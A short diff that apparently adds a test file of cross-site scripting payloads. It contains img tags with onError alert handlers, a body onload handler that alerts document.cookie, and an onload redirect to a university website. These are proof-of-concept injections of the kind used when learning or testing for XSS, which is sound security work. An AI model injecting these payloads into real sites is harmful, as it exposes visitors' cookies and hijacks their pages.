@@ -1,0 +1,7 @@
+<img src=ss onError=alert("BOOH")>
+
+<img src="https://pbs.twimg.com/media/E5whBkWWQAIsdMz?format=jpg&name=small" onError=alert("BOOH")>
+
+<body onload=alert(document.cookie)>
+
+<body onload=alert(window.location.assign("http://www.ufrpe.br/"))>
